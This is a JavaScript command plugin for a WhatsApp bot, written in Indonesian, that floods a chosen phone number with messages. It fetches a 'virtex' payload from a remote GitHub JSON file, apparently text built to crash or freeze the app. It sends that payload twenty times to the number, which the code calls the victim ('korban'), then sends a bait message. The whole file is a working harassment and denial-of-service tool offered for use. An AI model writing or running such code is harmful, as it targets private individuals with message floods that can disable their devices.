const { MessageType } = require('@adiwajshing/baileys')

let handler = async(m, { conn, text, args }) => {
    text = args.join(' ')
    if (!text) return conn.reply(m.chat, 'Silahkan masukan nomor yang akan di spam\n\n*Contoh:*\n.spam 6285xxxxxxxx', m)
    if (text.startsWith('+')) return conn.reply(m.chat, '[!] Tolong masukan Nomor dengan awalaan 62\n\n*Contoh:*\n.spam 6285xxxxxxxx|elyas ganteng', m)
    if (text.startsWith('@')) return conn.reply(m.chat, '[!] Tolong masukan Nomor dengan awalaan 62\n\n*Contoh:*\n.spam 6285xxxxxxxx|elyas ganteng', m)
    let res = await fetch(global.API('https://raw.githubusercontent.com', '/hdiiofficial/175/main/api/bahan.json'))
    if (!res.ok) throw await res.text()

    let korban = `${text}`
    var nomor = m.sender
    let spam = await res.json()
    let spam1 = `${spam}`
    let umpan = `Punten oyyy\n\n\nAda orang?\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nMwehehe`
    
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
    
    await conn.sendMessage(korban + '@s.whatsapp.net', {text:umpan}, global.ftroli)
    await m.reply(`Sukses`)
}
handler.help = ['svi nomor', 'spamvirtex nomor']
handler.tags = ['owner']
handler.command = /^(svi|spamvirtex)$/i
handler.rowner = true

module.exports = handler
